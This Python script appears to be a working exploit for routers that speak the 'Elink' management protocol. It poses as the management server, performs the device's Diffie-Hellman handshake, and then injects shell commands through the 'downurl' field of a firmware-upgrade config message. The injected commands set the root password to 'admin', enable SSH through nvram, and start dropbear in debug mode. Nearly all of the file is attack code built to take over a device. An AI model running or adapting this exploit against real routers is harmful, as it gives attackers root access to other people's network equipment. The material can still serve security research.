import base64
import json
import random
import socket
import logging
import struct
from threading import Thread, Lock
import time
from Crypto.Cipher import AES

HeaderLen = 8
MaxDataLen = 1024
GlobalFlag = 0x3F721FB5
GlobalMac = "123456789ABC"


class ElinkHead:
    def __init__(self, flag=0, length=0):
        self.flag = flag
        self.len = length


class ElinkPacket:
    def __init__(self, head=ElinkHead(), data=b''):
        self.head = head
        self.data = data

    @classmethod
    def fromData(cls, data: bytes):
        head = ElinkHead()
        head.flag = GlobalFlag
        head.len = len(data)

        return cls(head, data)


class ElinkSession:
    def __init__(self, conn):
        self.conn: socket.socket = conn
        self.key: bytes = None
        self.perMac = None
        self.recvSeq = 0
        self.sendSeq = 0
        self.isReg = False
        self.devInfo = None
        self.mutex = Lock()

    def send(self, packet: ElinkPacket):
        with self.mutex:
            headBuf = struct.pack('>II', packet.head.flag, packet.head.len)
            self.sendSeq = self.sendSeq + 1
            self.conn.send(headBuf + packet.data)

    def sendACK(self, recvSeq):
        self.recvSeq = recvSeq
        response = {
            "type": "ack",
            "sequence": self.recvSeq,
            "mac": GlobalMac
        }
        response = json.dumps(response).encode('utf-8')
        response = encryptData(response, self.key)
        self.send(ElinkPacket.fromData(response))


def parseHeader(headerBuf):
    Flag, Len = struct.unpack('>II', headerBuf)
    if Flag != GlobalFlag:
        err_msg = f"Parse Header Flag error: Recv Flag is {Flag}, need Flag is {GlobalFlag}\n"
        raise ValueError(err_msg)
    return ElinkHead(Flag, Len)


def decryptData(ciphertext: bytes, key: bytes):
    iv = bytes([0x00] * AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    plaintext = cipher.decrypt(ciphertext)
    plaintext = plaintext.strip(b'\x00')
    return plaintext


def encryptData(plaintext: bytes, key: bytes):
    if len(plaintext) % AES.block_size != 0:
        padLen = AES.block_size - len(plaintext) % AES.block_size
        plaintext += bytes([0x00] * padLen)
    iv = bytes([0x00] * AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext


def handleKeyNgReq(session: ElinkSession, request: dict):
    session.perMac = request["mac"]
    response = {
        "type": "keyngack",
        "sequence": session.sendSeq,
        "mac": GlobalMac,
        "keymode": "dh"
    }
    response = json.dumps(response).encode('utf-8')
    session.send(ElinkPacket.fromData(response))


def handleDH(session: ElinkSession, request: dict):
    gBytes = base64.b64decode(request['data']['dh_g'])
    pBytes = base64.b64decode(request['data']['dh_p'])
    kBytes = base64.b64decode(request['data']['dh_key'])

    gInt = int.from_bytes(gBytes, byteorder='big')
    pInt = int.from_bytes(pBytes, byteorder='big')
    alicePublicKey = int.from_bytes(kBytes, byteorder='big')

    bobPrivateKey = random.randint(2, pInt - 2)
    bobPublicKey = pow(gInt, bobPrivateKey, pInt)
    sharedKey = pow(alicePublicKey, bobPrivateKey, pInt)
    pubBase64 = base64.b64encode(bobPublicKey.to_bytes(
        len(kBytes), byteorder='big')).decode()

    session.key = sharedKey.to_bytes(len(kBytes), byteorder='big')

    response = {
        "type": "dh",
        "sequence": session.sendSeq,
        "mac": GlobalMac,
        "data": {
            "dh_key": pubBase64,
            "dh_p": request['data']['dh_p'],
            "dh_g": request['data']['dh_g']
        }

    }
    response = json.dumps(response).encode('utf-8')
    session.send(ElinkPacket.fromData(response))


def upgradeConfig(session: ElinkSession, cfg: dict):
    response = {
        "type": "cfg",
        "sequence": session.sendSeq,
        "mac": GlobalMac,
        "set": cfg
    }
    response = json.dumps(response).encode('utf-8')
    response = encryptData(response, session.key)
    session.send(ElinkPacket.fromData(response))


def execute(session: ElinkSession, command: str):
    upgradeCfg = {
        "upgrade": {
            "downurl": f"-h; {command} ;echo",
            "isreboot": "0"
        }
    }
    upgradeConfig(session, upgradeCfg)


def handlePacket(session: ElinkSession, packet: ElinkPacket):
    if session.key is not None:
        packet.data = decryptData(packet.data, session.key)

    request = json.loads(packet.data)

    elinkType = request['type']
    if elinkType == "keyngreq":
        logging.debug("recv keyngreq")
        handleKeyNgReq(session, request)
    elif elinkType == "keyngack":
        logging.debug("recv keyngack")
    elif elinkType == "dh":
        logging.debug("recv dh")
        handleDH(session, request)
        logging.debug("after recv dh")
    elif elinkType == "dev_reg":
        logging.debug("recv dev_reg")
        session.devInfo = request['data']
        session.isReg = True
        session.sendACK(request['sequence'])
    elif elinkType == "keepalive":
        logging.debug("recv keepalive")
        session.sendACK(request['sequence'])
    elif elinkType == "ack":
        logging.debug("recv ack")
    elif elinkType == "cfg":
        logging.debug("recv cfg")
    elif elinkType == "get_status":
        logging.debug("recv get_status")
    elif elinkType == "status":
        logging.debug("recv status")
    elif elinkType == "real_devinfo":
        logging.debug("recv real dev info")
    else:
        logging.error("unknown request type")


def handle(session: ElinkSession):
    while True:
        try:
            headerBuf = session.conn.recv(HeaderLen)
            if len(headerBuf) < HeaderLen:
                logging.error("read header error")
                break

            header = parseHeader(headerBuf)

            remainingLen = header.len
            dataBuf = b''
            while remainingLen > 0:
                chunk = session.conn.recv(remainingLen)
                if not chunk:
                    logging.error("connection was closed by client")
                    return
                dataBuf += chunk
                remainingLen -= len(chunk)
        except Exception as e:
            logging.error(f"An exception occurred: {str(e)}")
            break

        handlePacket(session, ElinkPacket(header, dataBuf))

    logging.warning("close connection")
    session.conn.close()


def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("0.0.0.0", 32768))
        listener.listen()

        print("Waiting for device")

        while True:
            conn, addr = listener.accept()
            logging.info("accepted connection from %s", addr)
            session = ElinkSession(conn)
            Thread(target=handle, args=[session]).start()

            while not session.isReg:
                time.sleep(1)

            print("Device information:")
            print(session.devInfo)
            input("Press any key to continue...")

            execute(session, r"echo -e 'admin\nadmin' | passwd root")
            execute(session, r"nvram set ssh_en=1 && nvram commit")
            execute(session, r"""sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear && /etc/init.d/dropbear start """)

            print("finish")


if __name__ == '__main__':
    main()
